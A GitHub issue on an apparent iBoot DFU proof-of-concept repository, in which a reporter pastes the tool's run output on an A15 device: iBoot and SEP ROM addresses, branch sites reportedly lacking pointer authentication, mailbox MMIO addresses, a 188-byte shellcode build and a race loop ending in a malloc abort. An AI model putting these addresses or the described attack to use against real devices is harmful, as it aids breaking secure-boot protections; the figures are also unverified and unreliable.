# 1st test

- URL: https://github.com/ncxcy/A14-A16-iBoot-DFU-PoC/issues/1
- Repo: ncxcy/A14-A16-iBoot-DFU-PoC (language: C)
- State: open; created 2026-10-01T14:43:12Z; status ok; passes main

## Issue body

reporter (NONE) · iosEXfrp · 2026-10-01T14:43:12Z · https://github.com/ncxcy/A14-A16-iBoot-DFU-PoC/issues/1

./poc         
poc: iboot dfu jtbl and sep vuln map
i tested on A15 Bionic
iboot findings:
  dfu buf:     0x0000000002006500
  jtbl base:   0x000000086bb2be5c
  jtbl table:  0x000000086bb2c0a8
  exec fn:     0x000000086bab9388

sep vuln map:
  vuln seprom1 jtbl br sites (no pac):
    0x0028f4  0x006384  0x006ccc  0x009710  0x00cdfc
    0x010e6c  0x014038  0x024654  0x024850  0x0249bc
  vuln seprom2 unprotected ret (no pacibsp): 109 sites
  vuln seprom3 mbox mmio:
    tx  0x5d080000
    rx  0x5d040000
    aes 0x5c100000
  vuln seprom4 vecttbl inline code at 0x01e780
  vuln seprom5 loop candidates 0x0035e4  0x0048b4

building shellcode...
shellcode: 188 bytes
looking for dfu device 05ac:1227...
device vid=05ac pid=1227 serial=SDOM:01 CPID:8110 CPRV:11 CPFM:03 SCEP:01 BDID:18 ECID:00121........E IBFL:3C SRTG:[iBoot-6338.0.0.200.19]

running race 5000 iters...
poc(5205,0x7ff847edc100) malloc: *** error for object 0x600003b78000: pointer being freed was not allocated
poc(5205,0x7ff847edc100) malloc: *** set a breakpoint in malloc_error_break to debug
zsh: abort      ./poc

